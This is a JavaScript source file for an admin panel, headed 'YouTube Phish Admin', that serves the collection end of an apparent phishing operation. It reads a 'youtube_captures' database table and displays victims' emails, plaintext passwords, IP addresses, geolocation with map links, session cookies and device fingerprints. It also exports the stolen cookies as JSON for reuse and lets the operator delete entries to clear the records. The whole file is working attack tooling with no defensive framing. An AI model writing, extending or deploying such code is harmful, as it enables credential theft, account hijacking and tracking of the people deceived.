// api/retrieve.js — Admin panel for YouTube captures
// Access: /admin?key=YOUR_SECRET

import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const ADMIN_KEY = process.env.ADMIN_SECRET_KEY || "change-me";

export default async function handler(req, res) {
    res.setHeader('Content-Type', 'text/html');

    const accessKey = req.query.key;
    if (!accessKey || accessKey !== ADMIN_KEY) {
        return res.status(401).send('<h1>Unauthorized</h1>');
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

    const action = req.query.action || 'list';

    if (action === 'list') return await showList(req, res, supabase);
    if (action === 'stats') return await showStats(req, res, supabase);
    if (action === 'export') return await exportCookies(req, res, supabase);
    if (action === 'clear') return await clearData(req, res, supabase);
    if (action === 'view') return await viewEntry(req, res, supabase);
    if (action === 'delete') return await deleteEntry(req, res, supabase);

    return res.send(`
        <!DOCTYPE html>
        <html><head><title>YouTube Phish Admin</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width">
        <style>
            * { box-sizing:border-box; margin:0; padding:0; }
            body { font-family:-apple-system,sans-serif; background:#f5f5f5; padding:40px; }
            .card { background:white; padding:30px; border-radius:12px; box-shadow:0 1px 4px rgba(0,0,0,0.1); max-width:500px; margin:0 auto; }
            h1 { color:#333; margin-bottom:20px; }
            ul { list-style:none; }
            li { margin:12px 0; }
            li a { display:block; padding:14px 20px; background:#FF0000; color:white; text-decoration:none; border-radius:8px; font-weight:500; text-align:center; }
            li a:hover { background:#cc0000; }
            .sub { text-align:center; margin-top:12px; font-size:13px; color:#888; }
        </style>
        </head><body>
            <div class="card">
                <h1>YouTube Phish Admin</h1>
                <ul>
                    <li><a href="?key=${accessKey}&action=list">View Captured Data</a></li>
                    <li><a href="?key=${accessKey}&action=stats">Statistics</a></li>
                    <li><a href="?key=${accessKey}&action=export" target="_blank">Export Cookies (JSON)</a></li>
                    <li><a href="?key=${accessKey}&action=clear" onclick="return confirm('Delete ALL captured data?')">Clear All Data</a></li>
                </ul>
                <div class="sub">Using Supabase — youtube_captures table</div>
            </div>
        </body></html>
    `);
}

async function showList(req, res, supabase) {
    try {
        const page = parseInt(req.query.page) || 1;
        const limit = 50;
        const offset = (page - 1) * limit;

        const { data: entries, error, count } = await supabase
            .from('youtube_captures')
            .select('*', { count: 'exact' })
            .order('timestamp', { ascending: false })
            .range(offset, offset + limit - 1);

        if (error) throw error;

        const totalPages = Math.ceil((count || 0) / limit);

        let html = `
        <!DOCTYPE html>
        <html><head>
        <title>YouTube Captures</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width">
        <style>
            * { box-sizing:border-box; margin:0; padding:0; }
            body { font-family:-apple-system,sans-serif; background:#f5f5f5; padding:20px; }
            h1 { color:#333; margin-bottom:8px; }
            .count { color:#666; margin-bottom:16px; font-size:14px; }
            .nav { margin-bottom:20px; display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
            .nav a { color:#1a73e8; text-decoration:none; font-size:13px; padding:6px 12px; border-radius:6px; background:#fff; border:1px solid #ddd; }
            .nav a:hover { background:#f1f3f4; }
            .nav .search-box { display:inline-flex; gap:4px; }
            .nav .search-box input { padding:6px 10px; border:1px solid #ddd; border-radius:6px; font-size:13px; }
            .nav .search-box button { padding:6px 12px; background:#1a73e8; color:white; border:none; border-radius:6px; cursor:pointer; }
            table { width:100%; border-collapse:collapse; background:#fff; box-shadow:0 1px 4px rgba(0,0,0,0.1); border-radius:8px; overflow:hidden; }
            th { background:#FF0000; color:white; padding:12px 8px; text-align:left; font-size:12px; }
            td { padding:8px; border-bottom:1px solid #eee; font-size:13px; vertical-align:top; }
            tr:hover { background:#fff5f5; }
            .map-link { color:#1a73e8; text-decoration:none; }
            .details-summary { cursor:pointer; color:#1a73e8; font-weight:500; }
            .details-summary:hover { text-decoration:underline; }
            .cookie-data { max-width:300px; word-break:break-all; font-size:11px; max-height:80px; overflow-y:auto; background:#f9f9f9; padding:4px; border-radius:4px; }
            .badge { display:inline-block; padding:2px 8px; border-radius:10px; font-size:11px; font-weight:600; }
            .badge.yes { background:#e8f5e9; color:#2e7d32; }
            .badge.no { background:#fce4ec; color:#c62828; }
            .pagination { margin-top:20px; display:flex; gap:8px; justify-content:center; align-items:center; }
            .pagination a { padding:6px 12px; background:#fff; border:1px solid #ddd; border-radius:6px; text-decoration:none; color:#333; }
            .pagination a:hover { background:#f1f3f4; }
            .pagination .current { padding:6px 12px; background:#FF0000; color:white; border-radius:6px; }
            .del-link { color:#d93025; text-decoration:none; font-size:11px; }
            .del-link:hover { text-decoration:underline; }
            @media (max-width:768px) { table { font-size:11px; } td,th { padding:6px 4px; } }
        </style>
        </head><body>
            <div class="nav">
                <a href="?key=${req.query.key}">Home</a>
                <a href="?key=${req.query.key}&action=stats">Stats</a>
                <a href="?key=${req.query.key}&action=export" target="_blank">Export Cookies</a>
                <a href="?key=${req.query.key}&action=clear" onclick="return confirm('Delete ALL data?')">Clear All</a>
                <form style="display:inline" method="get">
                    <input type="hidden" name="key" value="${req.query.key}">
                    <input type="hidden" name="action" value="list">
                    <div class="search-box">
                        <input type="text" name="search" placeholder="Search email..." value="${escapeHtml(req.query.search || '')}">
                        <button type="submit">Search</button>
                    </div>
                </form>
            </div>
            <h1>YouTube Captured Credentials</h1>
            <div class="count">Total: <strong>${count || 0}</strong> captures (page ${page}/${totalPages})</div>
            <table>
                <tr>
                    <th>#</th>
                    <th>Time</th>
                    <th>Email</th>
                    <th>Password</th>
                    <th>IP</th>
                    <th>Location</th>
                    <th>Map</th>
                    <th>Cookies</th>
                    <th>Device</th>
                    <th></th>
                </tr>`;

        if (!entries || entries.length === 0) {
            html += `<tr><td colspan="10" style="text-align:center;padding:40px;color:#888;">No captures yet</td></tr>`;
        } else {
            entries.forEach((e, i) => {
                const ipStr = e.ip?.ip || '-';
                const lat = e.location?.lat ?? '-';
                const lon = e.location?.lon ?? '-';
                const mapLink = (lat !== '-' && lon !== '-') 
                    ? `<a class="map-link" href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">📍</a>`
                    : '-';
                
                const cookieCount = e.cookie_count || 0;
                const cookieBadge = cookieCount > 0 
                    ? `<span class="badge yes">${cookieCount}</span>`
                    : `<span class="badge no">0</span>`;

                const deviceHtml = e.device ? `
                    <details>
                        <summary class="details-summary">View</summary>
                        <small>
                            ${escapeHtml(e.device?.platform || '-')} |
                            ${e.device?.screenWidth || '?'}x${e.device?.screenHeight || '?'} |
                            GPU: ${e.device?.gpuVendor?.renderer?.substring(0,30) || '-'} |
                            ${e.device?.deviceMemory || '?'}GB |
                            ${e.device?.hardwareConcurrency || '?'} cores
                        </small>
                    </details>` : '-';

                const cookiesHtml = e.cookie_raw ? `
                    <details>
                        <summary class="details-summary">${cookieBadge} cookies</summary>
                        <div class="cookie-data">${escapeHtml(e.cookie_raw.substring(0,600))}</div>
                    </details>` : cookieBadge;

                html += `<tr>
                    <td>${offset + i + 1}</td>
                    <td>${new Date(e.timestamp).toLocaleString()}</td>
                    <td><strong>${escapeHtml(e.email)}</strong></td>
                    <td><code>${escapeHtml(e.password)}</code></td>
                    <td>${escapeHtml(ipStr)}${e.ip?.city ? '<br><small>' + escapeHtml(e.ip.city) + ', ' + escapeHtml(e.ip.country || '') + '</small>' : ''}</td>
                    <td>${lat}, ${lon}</td>
                    <td>${mapLink}</td>
                    <td>${cookiesHtml}</td>
                    <td>${deviceHtml}</td>
                    <td><a class="del-link" href="?key=${req.query.key}&action=delete&id=${e.id}" onclick="return confirm('Delete entry #${offset+i+1}?')">del</a></td>
                </tr>`;
            });
        }

        // Pagination
        if (totalPages > 1) {
            html += `<tr><td colspan="10"><div class="pagination">`;
            if (page > 1) {
                html += `<a href="?key=${req.query.key}&action=list&page=${page-1}">← Prev</a>`;
            }
            html += `<span class="current">${page}</span>`;
            if (page < totalPages) {
                html += `<a href="?key=${req.query.key}&action=list&page=${page+1}">Next →</a>`;
            }
            html += `</div></td></tr>`;
        }

        html += `</table></body></html>`;
        res.send(html);
    } catch (err) {
        res.status(500).send(`<h1>Error</h1><p>${escapeHtml(err.message)}</p>`);
    }
}

async function showStats(req, res, supabase) {
    try {
        const { count: total, error } = await supabase
            .from('youtube_captures')
            .select('*', { count: 'exact', head: true });

        // Get count of entries with cookies
        const { count: withCookies } = await supabase
            .from('youtube_captures')
            .select('*', { count: 'exact', head: true })
            .gt('cookie_count', 0);

        // Get count of entries with location
        const { count: withLocation } = await supabase
            .from('youtube_captures')
            .select('*', { count: 'exact', head: true })
            .not('location', 'is', null);

        // Get latest entry
        const { data: latest } = await supabase
            .from('youtube_captures')
            .select('email, timestamp')
            .order('timestamp', { ascending: false })
            .limit(1);

        res.send(`
            <!DOCTYPE html>
            <html><head><title>YouTube Stats</title>
            <style>
                body { font-family:-apple-system,sans-serif; padding:40px; background:#f5f5f5; }
                .card { background:white; padding:30px; border-radius:8px; box-shadow:0 1px 4px rgba(0,0,0,0.1); max-width:500px; margin:0 auto; }
                h1 { color:#333; }
                .stat-row { display:flex; justify-content:space-between; padding:12px 0; border-bottom:1px solid #eee; }
                .stat-row:last-child { border-bottom:none; }
                .stat-label { color:#666; }
                .stat-value { font-weight:bold; font-size:18px; color:#FF0000; }
                .nav { margin-bottom:20px; }
                .nav a { color:#1a73e8; text-decoration:none; margin-right:15px; }
            </style>
            </head><body>
                <div class="card">
                    <div class="nav"><a href="?key=${req.query.key}&action=list">← Back to list</a></div>
                    <h1>Statistics</h1>
                    <div class="stat-row"><span class="stat-label">Total captures</span><span class="stat-value">${total || 0}</span></div>
                    <div class="stat-row"><span class="stat-label">With cookies</span><span class="stat-value">${withCookies || 0}</span></div>
                    <div class="stat-row"><span class="stat-label">With geo-location</span><span class="stat-value">${withLocation || 0}</span></div>
                    <div class="stat-row"><span class="stat-label">Latest capture</span><span class="stat-value" style="font-size:14px;">${latest && latest[0] ? escapeHtml(latest[0].email) : 'N/A'}</span></div>
                </div>
            </body></html>
        `);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function exportCookies(req, res, supabase) {
    try {
        const { data: entries, error } = await supabase
            .from('youtube_captures')
            .select('email, cookie_raw, cookie_count, ip, location, timestamp, user_agent, platform, device')
            .gt('cookie_count', 0)
            .order('timestamp', { ascending: false });

        if (error) throw error;

        const cookieExports = (entries || []).map(e => ({
            captured_at: e.timestamp,
            email: e.email,
            ip: e.ip?.ip,
            location: e.location ? `${e.location.lat},${e.location.lon}` : null,
            cookies_raw: e.cookie_raw,
            cookie_count: e.cookie_count,
            user_agent: e.user_agent || e.device?.userAgent,
            platform: e.platform || e.device?.platform
        }));

        const jsonStr = JSON.stringify(cookieExports, null, 2);
        
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename="youtube_cookies_export_${Date.now()}.json"`);
        res.send(jsonStr);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function viewEntry(req, res, supabase) {
    try {
        const id = req.query.id;
        if (!id) return res.send('Missing ID');

        const { data: entry, error } = await supabase
            .from('youtube_captures')
            .select('*')
            .eq('id', id)
            .single();

        if (error || !entry) return res.send('Entry not found');

        res.setHeader('Content-Type', 'application/json');
        res.send(JSON.stringify(entry, null, 2));
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function deleteEntry(req, res, supabase) {
    try {
        const id = req.query.id;
        if (!id) return res.send('Missing ID');

        const { error } = await supabase
            .from('youtube_captures')
            .delete()
            .eq('id', id);

        if (error) throw error;

        res.redirect(`?key=${req.query.key}&action=list`);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function clearData(req, res, supabase) {
    try {
        const { error } = await supabase
            .from('youtube_captures')
            .delete()
            .neq('id', 0); // Delete all rows

        if (error) throw error;

        res.send(`
            <h1>Cleared</h1>
            <p>All captured data has been deleted from Supabase.</p>
            <a href="?key=${req.query.key}">Back to Admin</a>
        `);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

function escapeHtml(str) {
    if (typeof str !== 'string') return str;
    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
